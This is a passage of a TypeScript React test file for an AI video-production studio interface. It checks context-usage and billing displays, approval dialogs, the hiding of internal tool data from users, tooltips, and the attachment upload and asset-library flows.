                  usage: { input_tokens: 12345, output_tokens: 500 },
                },
              },
            ],
          }),
        ),
      ),
    )
    await openHistory()
    fireEvent.click(screen.getByRole('button', { name: '上下文用量', exact: true }))
    expect(screen.getByText('上次输入 12,345 tokens')).toBeInTheDocument()
    expect(screen.queryByText(/剩余.*%/)).not.toBeInTheDocument()
  })
  it('replaces cumulative billing updates without adding the same charge twice', async () => {
    render(<DeepAgentStudio />)
    await openHistory()
    act(() => {
      for (const cursor of [8, 9])
        Socket.instances[0].emit({
          event: 'update',
          cursor,
          data: {
            run_id: 'run1',
            type: 'ACTIVITY_SNAPSHOT',
            data: { settled_credits: '1326.000', by_kind: { video: '1326.000', image: '0', text: '0' } },
          },
        })
    })
    expect(screen.getAllByText('本次共消耗 1326.000 积分')).toHaveLength(1)
    expect(screen.queryByText(/2652/)).not.toBeInTheDocument()
  })
})

it('keeps execution internals hidden while retaining readable task outcomes', () => {
  render(
    <EventCard
      event={{
        id: 'tool',
        kind: 'tool',
        text: 'studio.read_context({secret_internal: true})',
        data: { tool: 'studio.read_context', status: 'succeeded', secret_internal: 'private-payload' },
      }}
    />,
  )
  expect(screen.getByText('读取制作资料', { selector: 'strong' })).toBeInTheDocument()
  expect(document.body.textContent).not.toMatch(/secret_internal|private-payload|studio\.read_context/)
  expect(document.querySelector('pre')).toBeNull()
})
it('replaces raw approval JSON with readable content without changing its frozen scope', async () => {
  const args = {
    batch_id: 'internal-batch',
    nodes: [
      {
        title: '雨夜入场',
        estimated_cost: 34,
        arguments: {
          model_version_id: 18,
          params: { prompt: '人物进入房间', duration: 8, resolution: '480p', generate_audio: true },
          idempotency_key: 'internal-key',
        },
      },
    ],
  }
  const onDecision = vi.fn().mockResolvedValue(undefined)
  render(
    <Approval
      models={catalog.models}
      run={snapshot({
        status: 'waiting',
        decision_id: 'd1',
        pending: { tool: 'production.generate_batch', arguments: args },
      })}
      busy={false}
      onDecision={onDecision}
    />,
  )
  expect(screen.getByText('雨夜入场')).toBeInTheDocument()
  expect(screen.getByText('模型：Seedance 2.5')).toBeInTheDocument()
  expect(screen.getByText('清晰度：480p')).toBeInTheDocument()
  expect(document.body.textContent).not.toMatch(/internal-batch|internal-key|idempotency_key/)
  fireEvent.click(screen.getByRole('button', { name: '确认并继续' }))
  await waitFor(() =>
    expect(onDecision).toHaveBeenCalledWith(
      expect.objectContaining({ decision_id: 'd1', decision: 'approve', arguments: args }),
    ),
  )
})

it('updates real context remaining over websocket without rendering the summary in chat', async () => {
  render(<DeepAgentStudio />)
  await openHistory()
  const data = {
    capacity_tokens: 100000,
    input_tokens: 25000,
    remaining_percent: 75,
    measurement: 'provider_usage',
    auto_compaction: true,
    compaction_count: 2,
    status: 'ready',
  }
  act(() =>
    Socket.instances[0].emit({
      event: 'update',
      cursor: 8,
      data: {
        run_id: 'run1',
        type: 'MESSAGE_UPSERT',
        data: { id: 'ctx', kind: 'context', text: 'private-context-summary', data },
      },
    }),
  )
  fireEvent.click(screen.getByRole('button', { name: '上下文用量', exact: true }))
  expect(screen.getByText('上次请求后剩余 75%')).toBeInTheDocument()
  expect(screen.getByText('上次请求后可用：75,000 tokens')).toBeInTheDocument()
  expect(screen.getByText('自动压缩：已开启')).toBeInTheDocument()
  expect(screen.getByText('已整理 2 次')).toBeInTheDocument()
  expect(document.body.textContent).not.toContain('private-context-summary')
  act(() =>
    Socket.instances[0].emit({
      event: 'update',
      cursor: 9,
      data: {
        run_id: 'run1',
        type: 'MESSAGE_UPSERT',
        data: { id: 'ctx', kind: 'context', text: '', data: { ...data, capacity_tokens: null } },
      },
    }),
  )
  expect(screen.queryByText(/剩余.*%/)).not.toBeInTheDocument()
  expect(screen.getByText('模型上下文总容量：未提供')).toBeInTheDocument()
})
it('preserves user-facing correction and recovery progress messages', () => {
  render(
    <Conversation
      onDocument={() => {}}
      events={[
        { id: 'fix', kind: 'progress', text: '分镜资料需要补充，正在自动纠正', data: { reason: 'draft_validation' } },
        {
          id: 'restore',
          kind: 'progress',
          text: '成功素材已保留，正在恢复任务',
          data: { status: 'running', internal: 'hidden' },
        },
      ]}
    />,
  )
  expect(screen.getByText('分镜资料需要补充，正在自动纠正')).toBeVisible()
  expect(document.body.textContent).toContain('成功素材已保留，正在恢复任务')
  expect(document.body.textContent).not.toMatch(/draft_validation|internal/)
})
it('hover and keyboard focus show the same custom tooltip without native duplicates', async () => {
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  const button = screen.getByRole('button', { name: '模型', exact: true })
  expect(button).not.toHaveAttribute('title')
  fireEvent.pointerOver(button)
  expect(screen.getByRole('tooltip')).toHaveTextContent('选择模型')
  fireEvent.pointerOut(button)
  expect(screen.queryByRole('tooltip')).not.toBeInTheDocument()
  fireEvent.focus(button)
  expect(screen.getByRole('tooltip')).toHaveTextContent('选择模型')
  fireEvent.keyDown(document, { key: 'Escape' })
  expect(screen.queryByRole('tooltip')).not.toBeInTheDocument()
})

it('attachment menu offers local upload and library; selected existing assets are sent once with selected models', async () => {
  const registered = vi.fn(),
    submitted = vi.fn()
  server.use(
    http.post('*/agent-studio/api/attachments', () =>
      HttpResponse.json({ id: 'uploaded44', asset_id: 44, name: '角色参考', type: 'image' }),
    ),
    http.get('*/agent-studio/api/library', () =>
      HttpResponse.json({ items: [{ id: 44, name: '角色参考', type: 'image' }], total: 1 }),
    ),
    http.post('*/agent-studio/api/attachments/library', async ({ request }) => {
      registered(await request.json())
      return HttpResponse.json({ attachments: [{ id: 'existing44', asset_id: 44, name: '角色参考', type: 'image' }] })
    }),
    http.post('*/agent-studio/api/runs', async ({ request }) => {
      submitted(await request.json())
      return HttpResponse.json({ id: 'run1' })
    }),
  )
  const { container } = render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  expect(screen.queryByText('图片 · Nano Banana Pro (Google)')).not.toBeInTheDocument()
  fireEvent.change(container.querySelector('input[type="file"]')!, {
    target: { files: [new NodeFile(['image'], 'reference.png', { type: 'image/png' })] },
  })
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  expect(screen.getByRole('button', { name: '本地上传' })).toBeInTheDocument()
  fireEvent.click(screen.getByRole('button', { name: '从素材库选择' }))
  fireEvent.click(await screen.findByRole('button', { name: /角色参考/ }))
  fireEvent.click(screen.getByRole('button', { name: '添加所选素材（1）' }))
  await waitFor(() => expect(screen.queryByRole('dialog', { name: '从素材库选择' })).not.toBeInTheDocument())
  expect(registered).toHaveBeenCalledExactlyOnceWith({ asset_ids: [44] })
  expect(screen.getAllByRole('button', { name: /移除/ })).toHaveLength(1)
  fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '使用这个角色' } })
  fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
  await waitFor(() => expect(submitted).toHaveBeenCalledOnce())
  expect(submitted.mock.calls[0][0]).toMatchObject({
    attachments: ['existing44'],
    selection: { image: 29, video: 18, mode: 'manual' },
  })
})
it('library errors stay visible and never attach or submit assets', async () => {
  server.use(http.get('*/agent-studio/api/library', () => HttpResponse.json({ error: '无素材权限' }, { status: 403 })))
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  fireEvent.click(screen.getByRole('button', { name: '从素材库选择' }))
  expect(await screen.findByRole('alert')).toHaveTextContent('无素材权限')
  expect(screen.getByRole('button', { name: '添加所选素材（0）' })).toBeDisabled()
})

it('local upload remains available from the attachment menu', async () => {
  const uploaded = vi.fn()
  server.use(
    http.post('*/agent-studio/api/attachments', async ({ request }) => {
      uploaded(await request.text())
      return HttpResponse.json({ id: 'local-script', type: 'prompt', characters: 5 })
    }),
  )
  const { container } = render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  const input = container.querySelector<HTMLInputElement>('input[type="file"]')!
  const open = vi.spyOn(input, 'click')
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  fireEvent.click(screen.getByRole('button', { name: '本地上传' }))
  expect(open).toHaveBeenCalledOnce()
  fireEvent.change(input, { target: { files: [new NodeFile(['scene'], 'story.txt', { type: 'text/plain' })] } })
  expect(await screen.findByRole('button', { name: '移除 story.txt' })).toBeInTheDocument()
  await waitFor(() => expect(uploaded).toHaveBeenCalledExactlyOnceWith('scene'))
})

it('closing library registration ignores its late response without attaching or generating', async () => {
  let finish!: () => void
  const registered = vi.fn()
  server.use(
    http.get('*/agent-studio/api/library', () =>
      HttpResponse.json({ items: [{ id: 44, name: '参考图', type: 'image' }], total: 1 }),
    ),
    http.post('*/agent-studio/api/attachments/library', async () => {
      registered()
      await new Promise<void>((resolve) => {
        finish = resolve
      })
      return HttpResponse.json({ attachments: [{ id: 'late', asset_id: 44, name: '迟到素材', type: 'image' }] })
    }),
  )
  render(<DeepAgentStudio />)
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  fireEvent.click(screen.getByRole('button', { name: '上传图片或剧本' }))
  fireEvent.click(screen.getByRole('button', { name: '从素材库选择' }))
  fireEvent.click(await screen.findByRole('button', { name: /参考图/ }))
  fireEvent.click(screen.getByRole('button', { name: '添加所选素材（1）' }))
  await waitFor(() => expect(registered).toHaveBeenCalledOnce())
  fireEvent.click(
    within(screen.getByRole('dialog', { name: '从素材库选择' })).getByRole('button', { name: '关闭', exact: true }),
  )
  await act(async () => {
    finish()
    await Promise.resolve()
  })
  expect(screen.queryByRole('button', { name: '移除 迟到素材' })).not.toBeInTheDocument()
  expect(screen.getByRole('button', { name: '发送创作要求' })).toBeDisabled()
})
